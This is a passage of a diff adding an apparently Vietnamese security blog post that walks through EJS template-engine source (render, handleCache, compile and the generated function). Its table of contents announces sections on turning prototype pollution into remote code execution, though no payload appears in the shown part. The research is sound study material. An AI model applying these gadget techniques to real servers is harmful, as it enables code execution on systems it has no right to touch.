+      </ul>
+    </li>
+    <li><a href="#các-method-để-lấy-prototype">Các method để lấy Prototype</a></li>
+    <li><a href="#resource-">Resource :</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#deep-down-to-ejs">DEEP DOWN TO EJS</a></li>
+    <li><a href="#example-usage-">Example usage :</a></li>
+    <li><a href="#how-ejs-works">How ejs works</a>
+      <ul>
+        <li><a href="#prototype-pollution-to-rce-">Prototype pollution to RCE .</a></li>
+      </ul>
+    </li>
+    <li><a href="#express-js">Express js</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#another-gadget-">Another gadget :</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+    <li><a href="#how-it-get-patched">How it get patched</a></li>
+    <li><a href="#universal-gadget">Universal Gadget</a></li>
+    <li><a href="#một-vài-điểm-thú-vị-về-for-in-">Một vài điểm thú vị về for in :</a></li>
+    <li><a href="#so-sánh-__proto__-và-constructorprototype">So sánh _<em>proto</em>_ và constructor.prototype?</a>
+      <ul>
+        <li><a href="#constructorprototype-">Constructor.prototype :</a></li>
+        <li><a href="#__proto__">__proto__</a></li>
+      </ul>
+    </li>
+    <li><a href="#các-method-để-lấy-prototype">Các method để lấy Prototype</a></li>
+    <li><a href="#resource-">Resource :</a></li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h1 class="relative group">DEEP DOWN TO EJS 
+    <div id="deep-down-to-ejs" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#deep-down-to-ejs" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+
+
+<h1 class="relative group">Example usage : 
+    <div id="example-usage-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#example-usage-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<ul>
+<li>Đơn giản như sau thui :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">ejs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;ejs&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">template</span> <span class="o">=</span> <span class="s1">&#39;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">ejs</span><span class="p">.</span><span class="nx">clearCache</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">{</span> <span class="nx">name</span><span class="o">:</span> <span class="s2">&#34;12113awefeaw&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kr">const</span> <span class="nx">compiled</span> <span class="o">=</span> <span class="nx">ejs</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="p">{});</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">compiled</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
+</span></span></code></pre></div>
+
+<h1 class="relative group">How ejs works 
+    <div id="how-ejs-works" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#how-ejs-works" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>Ta cùng đọc qua về hàm render :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nx">exports</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">d</span> <span class="o">||</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">o</span> <span class="o">||</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// No options object -- if there are optiony names
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// in the data, copy them to options
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">arguments</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopyFromList</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">_OPTS_PASSABLE_WITH_DATA</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">handleCache</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">template</span><span class="p">)(</span><span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">};</span>
+</span></span></code></pre></div><ul>
+<li>Hàm nhận vào data và options .</li>
+<li>Nếu không có options thì kiểu tra data xem có key nào có thể cho vào OPTIONS hay không theo danh sách trên :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">_OPTS_PASSABLE_WITH_DATA</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;delimiter&#39;</span><span class="p">,</span> <span class="s1">&#39;scope&#39;</span><span class="p">,</span> <span class="s1">&#39;context&#39;</span><span class="p">,</span> <span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="s1">&#39;compileDebug&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;client&#39;</span><span class="p">,</span> <span class="s1">&#39;_with&#39;</span><span class="p">,</span> <span class="s1">&#39;rmWhitespace&#39;</span><span class="p">,</span> <span class="s1">&#39;strict&#39;</span><span class="p">,</span> <span class="s1">&#39;filename&#39;</span><span class="p">,</span> <span class="s1">&#39;async&#39;</span><span class="p">];</span>
+</span></span></code></pre></div><ul>
+<li>Sau đó gọi hàm handleCache nhận về một function và cho data làm đối số. Vậy ta sẽ phải tìm hiểu hàm handleCache sẽ trả về function gì .</li>
+</ul>
+<p>handleCache :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="kd">function</span> <span class="nx">handleCache</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="nx">template</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">func</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="nx">options</span><span class="p">.</span><span class="nx">filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">hasTemplate</span> <span class="o">=</span> <span class="nx">arguments</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">options</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;cache option requires a filename&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">func</span> <span class="o">=</span> <span class="nx">exports</span><span class="p">.</span><span class="nx">cache</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="nx">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="nx">func</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nx">func</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">hasTemplate</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">template</span> <span class="o">=</span> <span class="nx">fileLoader</span><span class="p">(</span><span class="nx">filename</span><span class="p">).</span><span class="nx">toString</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="nx">_BOM</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">hasTemplate</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="c1">// istanbul ignore if: should not happen at all
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">filename</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;Internal EJS error: no file name or template &#39;</span>
+</span></span><span class="line"><span class="cl">              <span class="o">+</span> <span class="s1">&#39;provided&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">template</span> <span class="o">=</span> <span class="nx">fileLoader</span><span class="p">(</span><span class="nx">filename</span><span class="p">).</span><span class="nx">toString</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="nx">_BOM</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">func</span> <span class="o">=</span> <span class="nx">exports</span><span class="p">.</span><span class="nx">compile</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">options</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">options</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">exports</span><span class="p">.</span><span class="nx">cache</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">func</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">func</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>Trước hết nó sẽ kiểm tra options cache xem có hay không sau đó sẽ dùng filename đó đưa vào hàm cache.get(filename) để nhận về một function thứ mà ta có thể đưa data vào để nhận được template cuối cùng.</li>
+<li>Trường hợp không có cache thì sẽ dùng hàm <strong>compile</strong> với template và options được truyền vào.</li>
+</ul>
+<p>compile function  :</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      <span class="nx">exports</span><span class="p">.</span><span class="nx">compile</span> <span class="o">=</span> <span class="kd">function</span> <span class="nx">compile</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">opts</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">templ</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// v1 compat
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// &#39;scope&#39; is &#39;context&#39;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="c1">// FIXME: Remove this in a future version
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span> <span class="o">&amp;&amp;</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">scope</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">scopeOptionWarned</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">warn</span><span class="p">(</span><span class="s1">&#39;`scope` option is deprecated and will be removed in EJS 3&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">scopeOptionWarned</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">opts</span><span class="p">.</span><span class="nx">context</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">opts</span><span class="p">.</span><span class="nx">context</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">scope</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">          <span class="k">delete</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">scope</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">templ</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Template</span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">opts</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">templ</span><span class="p">.</span><span class="nx">compile</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="p">};</span>
+</span></span></code></pre></div><ul>
+<li>Tạo một Object template và trả về kết quả sau khi gọi hàm templ.compile()</li>
+<li>Class Template khá lớn nên mình sẽ tập trung vào hàm compile của nó . Hàm compile này là core function để tạo nên một function sẽ nhận data và trả về template.</li>
+<li>Trước khi đọc các giai đoạn nó tạo ra hàm thì ta có thể đơn giản là log hàm đó ra :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">anonymous</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">include</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">includeData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">(),</span> <span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">includeData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">d</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">d</span><span class="p">,</span> <span class="nx">includeData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">includeFile</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">opts</span><span class="p">)(</span><span class="nx">d</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">};</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">fn</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">context</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nx">data</span> <span class="o">||</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">(),</span> <span class="nx">escapeFn</span><span class="p">,</span> <span class="nx">include</span><span class="p">,</span> <span class="nx">rethrow</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>Copy data các kiểu xong sẽ dùng hàm fn.apply vậy ta cần biết fn ở đây là hàm gì . Đọc source ta có thẻ thấy đoạn sau  :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">    <span class="kd">var</span> <span class="nx">returnedFn</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">client</span> <span class="o">?</span> <span class="nx">fn</span> <span class="o">:</span> <span class="kd">function</span> <span class="nx">anonymous</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kd">var</span> <span class="nx">include</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">includeData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">(),</span> <span class="nx">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">includeData</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">d</span> <span class="o">=</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">shallowCopy</span><span class="p">(</span><span class="nx">d</span><span class="p">,</span> <span class="nx">includeData</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">includeFile</span><span class="p">(</span><span class="nx">path</span><span class="p">,</span> <span class="nx">opts</span><span class="p">)(</span><span class="nx">d</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">};</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">fn</span><span class="p">.</span><span class="nx">toString</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">      <span class="k">return</span> <span class="nx">fn</span><span class="p">.</span><span class="nx">apply</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">context</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">[</span><span class="nx">data</span> <span class="o">||</span> <span class="nx">utils</span><span class="p">.</span><span class="nx">createNullProtoObjWherePossible</span><span class="p">(),</span> <span class="nx">escapeFn</span><span class="p">,</span> <span class="nx">include</span><span class="p">,</span> <span class="nx">rethrow</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span></code></pre></div><ul>
+<li>Với options.client =0 thì ta sẽ nhận được hàm trên và fn ở đây sau khi log ra thì ta có  :</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">anonymous</span><span class="p">(</span><span class="nx">locals</span><span class="p">,</span> <span class="nx">escapeFn</span><span class="p">,</span> <span class="nx">include</span><span class="p">,</span> <span class="nx">rethrow</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">__line</span> <span class="o">=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">__lines</span> <span class="o">=</span> <span class="s2">&#34;&lt;h1&gt;Hello &lt;%= name %&gt;&lt;/h1&gt;&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">,</span> <span class="nx">__filename</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">var</span> <span class="nx">__output</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">function</span> <span class="nx">__append</span><span class="p">(</span><span class="nx">s</span><span class="p">)</span> <span class="p">{</span> <span class="k">if</span> <span class="p">(</span><span class="nx">s</span> <span class="o">!==</span> <span class="kc">undefined</span> <span class="o">&amp;&amp;</span> <span class="nx">s</span> <span class="o">!==</span> <span class="kc">null</span><span class="p">)</span> <span class="nx">__output</span> <span class="o">+=</span> <span class="nx">s</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="kd">with</span> <span class="p">(</span><span class="nx">locals</span> <span class="o">||</span> <span class="p">{})</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="p">;</span> <span class="nx">__append</span><span class="p">(</span><span class="s2">&#34;&lt;h1&gt;Hello &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">;</span> <span class="nx">__append</span><span class="p">(</span><span class="nx">escapeFn</span><span class="p">(</span> <span class="nx">name</span> <span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">;</span> <span class="nx">__append</span><span class="p">(</span><span class="s2">&#34;&lt;/h1&gt;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">__output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">rethrow</span><span class="p">(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">__lines</span><span class="p">,</span> <span class="nx">__filename</span><span class="p">,</span> <span class="nx">__line</span><span class="p">,</span> <span class="nx">escapeFn</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><ul>
+<li>Đến đây ta hoàn toàn có thể thấy được logic mà name được đưa vào template. Khá phức tạp ở đây nhưng ta sẽ tiếp tục đọc vào hàm này.</li>
+<li>Đây là source generate được đống function trên bằng cách ghép nhiều chuỗi với nhau</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">this</span><span class="p">.</span><span class="nx">source</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">this</span><span class="p">.</span><span class="nx">generateSource</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">prepended</span> <span class="o">+=</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  var __output = &#34;&#34;;\n&#39;</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">        <span class="s1">&#39;  function __append(s) { if (s !== undefined &amp;&amp; s !== null) __output += s }\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_JS_IDENTIFIER</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;outputFunctionName is not a valid JS identifier.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">prepended</span> <span class="o">+=</span> <span class="s1">&#39;  var &#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">outputFunctionName</span> <span class="o">+</span> <span class="s1">&#39; = __append;&#39;</span> <span class="o">+</span> <span class="s1">&#39;\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">_JS_IDENTIFIER</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="s1">&#39;localsName is not a valid JS identifier.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="nx">opts</span><span class="p">.</span><span class="nx">destructuredLocals</span> <span class="o">&amp;&amp;</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">destructuredLocals</span><span class="p">.</span><span class="nx">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">destructuring</span> <span class="o">=</span> <span class="s1">&#39;  var __locals = (&#39;</span> <span class="o">+</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">localsName</span> <span class="o">+</span> <span class="s1">&#39; || {}),\n&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">destructuredLocals</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="kd">var</span> <span class="nx">name</span> <span class="o">=</span> <span class="nx">opts</span><span class="p">.</span><span class="nx">destructuredLocals</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">_JS_IDENTIFIER</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">name</span><span class="p">))</span> <span class="p">{</span>
